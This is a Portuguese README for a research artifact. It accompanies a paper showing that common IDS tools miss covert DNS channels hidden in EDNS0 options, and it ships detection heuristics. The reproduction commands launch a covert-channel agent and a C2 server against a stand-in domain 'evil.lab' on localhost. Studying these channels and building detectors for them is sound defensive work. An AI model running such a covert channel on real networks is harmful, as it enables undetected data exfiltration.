# edns0-arbitrary

Artefato do artigo **"EDNS0 como Vetor Adversarial: Lacunas de Visibilidade Empírica
em Ferramentas Populares de DPI e Detecção de Intrusão"**, aceito no SBSeg 2026.

O artigo mostra que Suricata, Snort e Zeek em configuração padrão não detectam canais
encobertos via opções EDNS0 — zero alertas contra seis técnicas adversariais. O artefato
contém o gerador EDNStego (técnicas T1–T6), o parser Zeek que expõe as opções EDNS antes
invisíveis, e as heurísticas de detecção H1a–H4.

# Estrutura do readme.md

- `ednstego/` — gerador adversarial em Python. `agent.py` emite as consultas, `server.py`
  é o C2 que decodifica, `traffic_gen.py` gera o baseline benigno a partir da lista Tranco.
  `techniques/` tem um módulo por técnica (T1–T6, T3-variante, T4-variante nos 4 regimes).
- `plugin-spicy/` — `edns0-options.zeek`, o parser que enumera todas as opções do pseudo-RR
  OPT e as expõe ao script-land do Zeek (o BIF nativo só enxerga códigos 8, 10 e 11).
- `regras/zeek/` — heurísticas H1a–H4 mais o loader `edns0-detection.zeek`.
- `regras/suricata/` — regra H1a v3 e o script Lua de detecção de anomalia de bufsize.
- `lab/` — playbooks Ansible, scripts de provisionamento das cinco VMs e a topologia
  detalhada do laboratório em `lab/TOPOLOGY.md` (KVM + Open vSwitch).
- `corpora/` — hashes SHA-256 dos PCAPs. Os PCAPs das variantes T3 e T4 estão nos
  [Releases](https://github.com/the-red-ace/edns0-arbitrary/releases).

# Selos Considerados

Os selos considerados são: **Disponível**, **Funcional** e **Sustentável**.

# Informações básicas

| Componente | Versão |
|---|---|
| Sistema operacional | Ubuntu 24.04 (VMs KVM/QEMU) |
| Python | 3.12 |
| Zeek | 8.1.2 |
| Suricata | 7.0.x (H1a); 6.0.10 (avaliação stock) |
| BIND9 | 9.18.x |
| Open vSwitch | 3.x |

O laboratório usa cinco VMs numa bridge OVS isolada, sem rota para a Internet. Para
reproduzir os resultados de detecção não é necessário montar as VMs: basta rodar o Zeek
sobre os PCAPs dos Releases, ou gerar tráfego novo com o EDNStego contra um resolvedor
local. Os playbooks em `lab/` documentam o ambiente completo para quem quiser replicá-lo.

# Dependências

Python:
```
pip3 install dnspython scapy
```

Zeek 8.1+ (https://zeek.org/get-zeek/) e Suricata 7.0+
(`add-apt-repository ppa:oisf/suricata-stable`). Sem dependências de nuvem ou hardware
especial.

# Preocupações com segurança

O EDNStego envia consultas DNS com opções EDNS0 carregando payload arbitrário. **Deve ser
usado apenas em laboratório isolado.** O payload é um arquivo de teste; nada exfiltra dados
reais do sistema. O `server.py` (C2) apenas decodifica e registra o que recebe. Não há
persistência nem modificação de arquivos do sistema. Os comandos abaixo geram tráfego
somente contra um resolvedor local.

# Instalação

```bash
git clone https://github.com/the-red-ace/edns0-arbitrary.git
cd edns0-arbitrary
pip3 install dnspython scapy

# instalar o parser de opções EDNS no Zeek
zeek -N Zeek::Spicy   # confirmar que o Spicy está disponível
```

PCAPs das variantes nos [Releases](https://github.com/the-red-ace/edns0-arbitrary/releases):
`T3-variant-pcaps.zip` (50 PCAPs, H3) e `T4-variant-pcaps.zip` (200 PCAPs, H4).

# Teste mínimo

Gera tráfego T1 contra um resolvedor local e confirma que a heurística H1a dispara.

```bash
# terminal 1: C2 local
python3 -m ednstego.server --listen 127.0.0.1 --port 5300 --domain evil.lab

# terminal 2: captura + agente
sudo tcpdump -i lo -w /tmp/t1.pcap udp port 5300 &
python3 -m ednstego.agent --server evil.lab --resolver 127.0.0.1 --mode t1 --duration 20
sudo pkill tcpdump

# processar com o parser + heurísticas
zeek -r /tmp/t1.pcap plugin-spicy/edns0-options.zeek regras/zeek/edns0-detection.zeek
grep H1a notice.log
```

Saída esperada: linha `H1a_NonWhitelistCode` referente ao código 65001.

# Experimentos

Gerar os PCAPs canônicos T1–T6 uma vez, antes das reivindicações:

```bash
python3 -m ednstego.server --listen 127.0.0.1 --port 5300 --domain evil.lab &
mkdir -p /tmp/canonical
for t in t1 t2 t3 t4 t5 t6; do
    sudo tcpdump -i lo -w /tmp/canonical/$t.pcap udp port 5300 &
    python3 -m ednstego.agent --server evil.lab --resolver 127.0.0.1 --mode $t --duration 20
    sudo pkill -f "tcpdump.*$t.pcap"
done
```

## Reivindicação #1 — Zero detecções em configuração padrão (Tabela 2 do artigo)

```bash
for t in t1 t2 t3 t4 t5 t6; do
    zeek -r /tmp/canonical/$t.pcap local
    echo "$t: $(grep -c . notice.log 2>/dev/null || echo 0) alertas"; rm -f notice.log
done
# Esperado: 0 alertas em todas as técnicas
```

## Reivindicação #2 — Parser expõe códigos antes invisíveis (Tabela 3 do artigo)

```bash
zeek -r /tmp/canonical/t2.pcap plugin-spicy/edns0-options.zeek
grep -o "code.*" edns0_arbitrary.log | head   # código 12 aparece
zeek -r /tmp/canonical/t2.pcap                 # sem o parser, não aparece
```

## Reivindicação #3 — Heurísticas com P=1,00 e R=1,00 (Tabela 4 do artigo)

```bash
for t in t1 t2 t3 t4 t5 t6; do
    zeek -r /tmp/canonical/$t.pcap plugin-spicy/edns0-options.zeek regras/zeek/edns0-detection.zeek
    echo "$t: $(grep -c . notice.log 2>/dev/null || echo 0) notices"; rm -f notice.log
done
# T1,T5 -> H1a; T2 -> H1b; T3,T6 -> H2; T4 -> H4

# H3 (corpus T3-variante) e H4 (corpus T4-variante) sobre os PCAPs dos Releases
for pcap in T3-variant-pcaps/*.pcap; do
    zeek -r $pcap plugin-spicy/edns0-options.zeek regras/zeek/edns0-detection.zeek
    grep -q H3 notice.log && echo "H3 ok: $pcap"; rm -f notice.log
done
for regime in r1 r2 r3 r4; do
    n=0
    for pcap in T4-variant-pcaps/$regime/*.pcap; do
        zeek -r $pcap plugin-spicy/edns0-options.zeek regras/zeek/edns0-detection.zeek
        grep -q H4 notice.log && n=$((n+1)); rm -f notice.log
    done
    echo "regime $regime: $n/50"
done
# Esperado: r1=50, r2=0 (fora de escopo), r3=50, r4=50
```

## Reivindicação #4 — Teto de revocação do Suricata (Tabela 6 do artigo)

```bash
for t in t1 t2 t3 t4 t5 t6; do
    suricata -r /tmp/canonical/$t.pcap -S regras/suricata/h1a-codes-whitelist-v3.rules -l /tmp/suri/
    echo "$t: $(wc -l < /tmp/suri/fast.log) alertas"; rm -f /tmp/suri/fast.log
done
# Esperado: T1=1, T5=1, demais=0 (T6 perde o segundo código, limitação do artigo)
```

# LICENSE

MIT License. Texto completo em `LICENSE`.
